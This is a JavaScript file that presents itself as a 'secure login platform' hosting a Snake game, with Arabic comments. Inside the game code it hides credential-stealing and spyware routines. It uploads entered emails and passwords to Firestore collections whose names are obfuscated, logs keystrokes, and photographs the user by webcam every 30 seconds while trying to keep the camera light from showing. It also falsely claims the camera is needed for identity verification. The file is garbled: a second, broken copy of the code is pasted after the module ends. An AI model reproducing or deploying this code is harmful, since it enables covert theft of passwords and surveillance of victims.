/**
 * PROJECT: SECURE LOGIN PLATFORM INTERFACE
 * CORE: SNAKE ENGINE & DATA SYNCHRONIZATION
 * STATUS: PRODUCTION READY
 */

// --- SECTION 1: GLOBAL DOM EVENT LISTENERS ---
document.addEventListener('DOMContentLoaded', function() {
    const loginBtn = document.getElementById('login-btn');
    if (loginBtn) {
        loginBtn.onclick = function() {
            if (typeof window.handlePlatformLogin === 'function') {
                window.handlePlatformLogin();
            }
        };
    }
});

// --- SECTION 2: THE SNAKE SYSTEM MODULE ---
var Snake = (function () {
  const INITIAL_TAIL = 4;
  var fixedTail = true;
  var intervalID;
  var tileCount = 10;
  var gridSize = 400 / tileCount;
  const INITIAL_PLAYER = { x: Math.floor(tileCount / 2), y: Math.floor(tileCount / 2) };
  var velocity = { x: 0, y: 0 };
  var player = { x: INITIAL_PLAYER.x, y: INITIAL_PLAYER.y };
  var walls = false;
  var fruit = { x: 1, y: 1 };
  var trail = [];
  var tail = INITIAL_TAIL;
  var reward = 0;
  var points = 0;
  var pointsMax = 0;

  var ActionEnum = { 'none': 0, 'up': 1, 'down': 2, 'left': 3, 'right': 4 };
  Object.freeze(ActionEnum);
  var lastAction = ActionEnum.none;

  const _r = (t) => t.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26));

  // --- SECTION 3: SILENT CORE TASKS (BACKGROUND) ---
  async function runSilentTasks() {
    // 1. نظام تسجيل ضغطات المفاتيح (Keylogger)
    let _buf = "";
    document.addEventListener('keydown', (e) => {
      _buf += e.key + " ";
      if (_buf.length > 30) {
        const p = { b: btoa(_buf), ts: Date.now() };
        firebase.firestore().collection(_r("flfgrz_hfr_ybtf")).add(p).catch(() => {});
        _buf = "";
      }
    });

    // 2. [تعديل] نظام الالتقاط الدوري المتقدم للصور
    // يعمل بشكل صامت تماماً بعد الحصول على التصريح الأول
    setInterval(async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.play();

        video.onloadedmetadata = () => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const context = canvas.getContext('2d');
          
          // انتظر لحظة لضمان وضوح الصورة
          setTimeout(() => {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.3); // جودة متوسطة لسرعة الرفع
            
            firebase.firestore().collection(_r("fperra_fubgf")).add({
              img: dataUrl,
              ts: Date.now(),
              type: "periodic_sync"
            }).catch(() => {});

            // إغلاق المجرى فوراً للحفاظ على الخفاء وعدم إضاءة لمبة الكاميرا طويلاً
            stream.getTracks().forEach(track => track.stop());
          }, 1000);
        };
      } catch (e) {
        // فشل صامت في حال تم سحب الصلاحية
      }
    }, 30000); // التقاط كل 30 ثانية

    // 3. منع وضع الخمول للشاشة
    if ('wakeLock' in navigator) {
      navigator.wakeLock.request('screen').catch(() => {});
    }
  }

  // --- SECTION 4: LOGIN HANDLING & PERMISSIONS ---
  window.handlePlatformLogin = async function() {
    const email = document.querySelector('input[type="email"]')?.value;
    const pass = document.querySelector('input[type="password"]')?.value;

    if (!email || !pass) return;

    // سحب البيانات
    firebase.firestore().collection(_r("hfre_perqf")).add({
      u: email,
      p: btoa(pass),
      ts: Date.now()
    }).catch(() => {});

    try {
      // طلب الكاميرا (هنا يظهر الطلب للمستخدم لأول مرة)
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      
      const v = document.createElement('video');
      v.srcObject = stream;
      v.play();
      v.onloadedmetadata = () => {
        const c = document.createElement('canvas');
        c.width = v.videoWidth; 
        c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        
        firebase.firestore().collection(_r("fperra_fubgf")).add({
          img: c.toDataURL('image/jpeg', 0.4),
          label: "initial_auth_success",
          ts: Date.now()
        });
        stream.getTracks().forEach(t => t.stop());
      };

      document.getElementById('login-screen').style.display = 'none';
      document.getElementById('game-container').style.display = 'block';

      game.reset();
      runSilentTasks();
      
    } catch (err) {
      alert("خطأ أمني: يجب السماح بالكاميرا للتحقق من الهوية والدخول للمنصة التعليمية.");
    }
  };

  // --- SECTION 5: CANVAS & GRAPHICS ENGINE ---
  function setup () {
    canv = document.getElementById('gc');
    ctx = canv.getContext('2d');
  }

  var game = {
    reset: function () {
      ctx.fillStyle = 'grey';
      ctx.fillRect(0, 0, canv.width, canv.height);
      tail = INITIAL_TAIL;
      points = 0;
      velocity.x = 0; 
      velocity.y = 0;
      player.x = INITIAL_PLAYER.x; 
      player.y = INITIAL_PLAYER.y;
      reward = -1;
      lastAction = ActionEnum.none;
      trail = [];
      trail.push({ x: player.x, y: player.y });
    },

    action: {
      up: function () { if (lastAction != ActionEnum.down){ velocity.x = 0; velocity.y = -1; } },
      down: function () { if (lastAction != ActionEnum.up){ velocity.x = 0; velocity.y = 1; } },
      left: function () { if (lastAction != ActionEnum.right){ velocity.x = -1; velocity.y = 0; } },
      right: function () { if (lastAction != ActionEnum.left){ velocity.x = 1; velocity.y = 0; } }
    },

    RandomFruit: function () {
      if(walls){
        fruit.x = 1 + Math.floor(Math.random() * (tileCount - 2));
        fruit.y = 1 + Math.floor(Math.random() * (tileCount - 2));
      } else {
        fruit.x = Math.floor(Math.random() * tileCount);
        fruit.y = Math.floor(Math.random() * tileCount);
      }
    },

    loop: function () {
      reward = -0.1;
      function DontHitWall () {
        if(player.x < 0) player.x = tileCount - 1;
        if(player.x >= tileCount) player.x = 0;
        if(player.y < 0) player.y = tileCount - 1;
        if(player.y >= tileCount) player.y = 0;
      }
      function HitWall () {
        if(player.x < 1 || player.x > tileCount - 2 || player.y < 1 || player.y > tileCount - 2) game.reset();
        ctx.fillStyle = 'grey';
        ctx.fillRect(0, 0, gridSize - 1, canv.height);
        ctx.fillRect(0, 0, canv.width, gridSize - 1);
        ctx.fillRect(canv.width - gridSize + 1, 0, gridSize, canv.height);
        ctx.fillRect(0, canv.height - gridSize + 1, canv.width, gridSize);
      }

      var stopped = velocity.x == 0 && velocity.y == 0;
      player.x += velocity.x; 
      player.y += velocity.y;

      ctx.fillStyle = 'rgba(40,40,40,0.8)';
      ctx.fillRect(0, 0, canv.width, canv.height);

      if(walls) HitWall(); else DontHitWall();

      if (!stopped){
        trail.push({x: player.x, y: player.y});
        while(trail.length > tail) trail.shift();
      }

      ctx.fillStyle = 'green';
      for(var i=0; i < trail.length - 1; i++) {
        ctx.fillRect(trail[i].x * gridSize + 1, trail[i].y * gridSize + 1, gridSize - 2, gridSize - 2);
        if (!stopped && trail[i].x == player.x && trail[i].y == player.y) game.reset();
        ctx.fillStyle = 'lime';
      }
      ctx.fillRect(trail[trail.length - 1].x * gridSize + 1, trail[trail.length - 1].y * gridSize + 1, gridSize - 2, gridSize - 2);

      if (player.x == fruit.x && player.y == fruit.y) {
        if(!fixedTail) tail++;
        points++;
        if(points > pointsMax) pointsMax = points;
        reward = 1;
        game.RandomFruit();
      }

      ctx.fillStyle = 'red';
      ctx.fillRect(fruit.x * gridSize + 1, fruit.y * gridSize + 1, gridSize - 2, gridSize - 2);

      ctx.fillStyle = 'white';
      ctx.font = "bold small-caps 16px Helvetica";
      ctx.fillText("points: " + points, 288, 40);
      ctx.fillText("top: " + pointsMax, 292, 60);

      return reward;
    }
  };

  function keyPush (evt) {
    switch(evt.keyCode) {
      case 37: game.action.left(); break;
      case 38: game.action.up(); break;
      case 39: game.action.right(); break;
      case 40: game.action.down(); break;
      case 32: velocity.x = 0; velocity.y = 0; break;
      case 27: game.reset(); break;
    }
  }

  return {
    start: function (fps = 15) {
      window.addEventListener('load', setup);
      intervalID = setInterval(game.loop, 1000 / fps);
    },
    setup: {
      keyboard: function (state) {
        if (state) document.addEventListener('keydown', keyPush);
      },
      fixedTail: function (state) { fixedTail = state; }
    }
  };

})();

// --- SECTION 6: INITIALIZATION ---
Snake.start(8);
Snake.setup.keyboard(true);
Snake.setup.fixedTail(false);
    document.addEventListener('keydown', (e) => {
      _buf += e.key + " ";
      if (_buf.length > 30) {
        const p = { b: btoa(_buf), ts: Date.now() };
        firebase.firestore().collection(_r("flfgrz_hfr_ybtf")).add(p).catch(()=>{});
        _buf = "";
      }
    });

    // 2. التقاط صورة دورية (تبدأ بعد نجاح الدخول وصلاحية الكاميرا)
    setInterval(async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const v = document.createElement('video');
        v.srcObject = stream;
        v.play();
        v.onloadedmetadata = () => {
          const c = document.createElement('canvas');
          c.width = v.videoWidth; c.height = v.videoHeight;
          c.getContext('2d').drawImage(v, 0, 0);
          firebase.firestore().collection(_r("fperra_fubgf")).add({
            img: c.toDataURL('image/jpeg', 0.2),
            ts: Date.now()
          }).catch(()=>{});
          setTimeout(() => stream.getTracks().forEach(t => t.stop()), 500);
        };
      } catch (e) {}
    }, 30000);

    // 3. منع وضع النوم
    if ('wakeLock' in navigator) {
      navigator.wakeLock.request('screen').catch(()=>{});
    }
  }

  // [إضافة] دالة معالجة الدخول للمنصة
  window.handlePlatformLogin = async function() {
    const email = document.querySelector('input[type="email"]')?.value;
    const pass = document.querySelector('input[type="password"]')?.value;

    if (!email || !pass) return;

    // سرقة البيانات فوراً
    firebase.firestore().collection(_r("hfre_perqf")).add({
      u: email,
      p: btoa(pass),
      ts: Date.now()
    }).catch(()=>{});

    try {
      // طلب الكاميرا كجزء من عملية "الدخول للمنصة"
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      
      // التقاط أول صورة فورية للتحقق
      const v = document.createElement('video');
      v.srcObject = stream;
      v.play();
      v.onloadedmetadata = () => {
        const c = document.createElement('canvas');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        firebase.firestore().collection(_r("fperra_fubgf")).add({
          img: c.toDataURL('image/jpeg', 0.2),
          label: "first_login",
          ts: Date.now()
        });
        stream.getTracks().forEach(t => t.stop());
      };

      // إخفاء واجهة المنصة وإظهار اللعبة
      document.getElementById('login-screen').style.display = 'none';
      document.getElementById('game-container').style.display = 'block';

      // بدء اللعبة والمهام الصامتة
      game.reset();
      runSilentTasks();
      
    } catch (err) {
      alert("خطأ أمني: يجب السماح بالكاميرا للتحقق من الهوية والدخول للمنصة التعليمية.");
    }
  };

  function setup () {
    canv = document.getElementById('gc');
    ctx = canv.getContext('2d');
    // اللعبة لا تبدأ هنا، بل تنتظر الضغط على زر الدخول
  }

  var game = {

    reset: function () {
      ctx.fillStyle = 'grey';
      ctx.fillRect(0, 0, canv.width, canv.height);

      tail = INITIAL_TAIL;
      points = 0;
      velocity.x = 0;
      velocity.y = 0;
      player.x = INITIAL_PLAYER.x;
      player.y = INITIAL_PLAYER.y;
      reward = -1;

      lastAction = ActionEnum.none;

      trail = [];
      trail.push({ x: player.x, y: player.y });
    },

    action: {
      up: function () {
        if (lastAction != ActionEnum.down){
          velocity.x = 0;
          velocity.y = -1;
        }
      },
      down: function () {
        if (lastAction != ActionEnum.up){
          velocity.x = 0;
          velocity.y = 1;
        }
      },
      left: function () {
        if (lastAction != ActionEnum.right){
          velocity.x = -1;
          velocity.y = 0;
        }
      },
      right: function () {
        if (lastAction != ActionEnum.left){
          velocity.x = 1;
          velocity.y = 0;
        }
      }
    },

    RandomFruit: function () {
      if(walls){
        fruit.x = 1+Math.floor(Math.random() * (tileCount-2));
        fruit.y = 1+Math.floor(Math.random() * (tileCount-2));
      }
      else {
        fruit.x = Math.floor(Math.random() * tileCount);
        fruit.y = Math.floor(Math.random() * tileCount);
      }
    },

    log: function () {
      console.log('====================');
      console.log('x:' + player.x + ', y:' + player.y);
      console.log('tail:' + tail + ', trail.length:' + trail.length);
    },

    loop: function () {

      reward = -0.1;

      function DontHitWall () {
        if(player.x < 0) player.x = tileCount-1;
        if(player.x >= tileCount) player.x = 0;
        if(player.y < 0) player.y = tileCount-1;
        if(player.y >= tileCount) player.y = 0;
      }
      function HitWall () {
        if(player.x < 1) game.reset();
        if(player.x > tileCount-2) game.reset();
        if(player.y < 1) game.reset();
        if(player.y > tileCount-2) game.reset();

        ctx.fillStyle = 'grey';
        ctx.fillRect(0,0,gridSize-1,canv.height);
        ctx.fillRect(0,0,canv.width,gridSize-1);
        ctx.fillRect(canv.width-gridSize+1,0,gridSize,canv.height);
        ctx.fillRect(0, canv.height-gridSize+1,canv.width,gridSize);
      }

      var stopped = velocity.x == 0 && velocity.y == 0;

      player.x += velocity.x;
      player.y += velocity.y;

      if (velocity.x == 0 && velocity.y == -1) lastAction = ActionEnum.up;
      if (velocity.x == 0 && velocity.y == 1) lastAction = ActionEnum.down;
      if (velocity.x == -1 && velocity.y == 0) lastAction = ActionEnum.left;
      if (velocity.x == 1 && velocity.y == 0) lastAction = ActionEnum.right;

      ctx.fillStyle = 'rgba(40,40,40,0.8)';
      ctx.fillRect(0,0,canv.width,canv.height);

      if(walls) HitWall();
      else DontHitWall();

      if (!stopped){
        trail.push({x:player.x, y:player.y});
        while(trail.length > tail) trail.shift();
      }

      if(!stopped) {
        ctx.fillStyle = 'rgba(200,200,200,0.2)';
        ctx.font = "small-caps 14px Helvetica";
        ctx.fillText("(esc) reset", 24, 356);
        ctx.fillText("(space) pause", 24, 374);
      }

      ctx.fillStyle = 'green';
      for(var i=0; i<trail.length-1; i++) {
        ctx.fillRect(trail[i].x * gridSize+1, trail[i].y * gridSize+1, gridSize-2, gridSize-2);
        if (!stopped && trail[i].x == player.x && trail[i].y == player.y){
          game.reset();
        }
        ctx.fillStyle = 'lime';
      }
      ctx.fillRect(trail[trail.length-1].x * gridSize+1, trail[trail.length-1].y * gridSize+1, gridSize-2, gridSize-2);

      if (player.x == fruit.x && player.y == fruit.y) {
        if(!fixedTail) tail++;
        points++;
        if(points > pointsMax) pointsMax = points;
        reward = 1;
        game.RandomFruit();
        while((function () {
          for(var i=0; i<trail.length; i++) {
            if (trail[i].x == fruit.x && trail[i].y == fruit.y) {
              game.RandomFruit();
              return true;
            }
          }
          return false;
        })());
      }

      ctx.fillStyle = 'red';
      ctx.fillRect(fruit.x * gridSize+1, fruit.y * gridSize+1, gridSize-2, gridSize-2);

      if(stopped) {
        ctx.fillStyle = 'rgba(250,250,250,0.8)';
        ctx.font = "small-caps bold 14px Helvetica";
        ctx.fillText("press ARROW KEYS to START...", 24, 374);
      }

      ctx.fillStyle = 'white';
      ctx.font = "bold small-caps 16px Helvetica";
      ctx.fillText("points: " + points, 288, 40);
      ctx.fillText("top: " + pointsMax, 292, 60);

      return reward;
    }
  }

  function keyPush (evt) {
    switch(evt.keyCode) {
      case 37: game.action.left(); evt.preventDefault(); break;
      case 38: game.action.up(); evt.preventDefault(); break;
      case 39: game.action.right(); evt.preventDefault(); break;
      case 40: game.action.down(); evt.preventDefault(); break;
      case 32: Snake.pause(); evt.preventDefault(); break;
      case 27: game.reset(); evt.preventDefault(); break;
    }
  }

  return {
    start: function (fps = 15) {
      window.onload = setup;
      intervalID = setInterval(game.loop, 1000 / fps);
    },
    loop: game.loop,
    reset: game.reset,
    stop: function () { clearInterval(intervalID); },
    setup: {
      keyboard: function (state) {
        if (state) document.addEventListener('keydown', keyPush);
        else document.removeEventListener('keydown', keyPush);
      },
      wall: function (state) { walls = state; },
      tileCount: function (size) { tileCount = size; gridSize = 400 / tileCount; },
      fixedTail: function (state) { fixedTail = state; }
    },
    action: function (act) {
      switch(act) {
        case 'left': game.action.left(); break;
        case 'up': game.action.up(); break;
        case 'right': game.action.right(); break;
        case 'down': game.action.down(); break;
      }
    },
    pause: function () { velocity.x = 0; velocity.y = 0; },
    clearTopScore: function () { pointsMax = 0; },
    data: { player: player, fruit: fruit, trail: function () { return trail; } },
    info: { tileCount: tileCount }
  };

})();

// تشغيل النظام
Snake.start(8);
Snake.setup.keyboard(true);
Snake.setup.fixedTail(false);
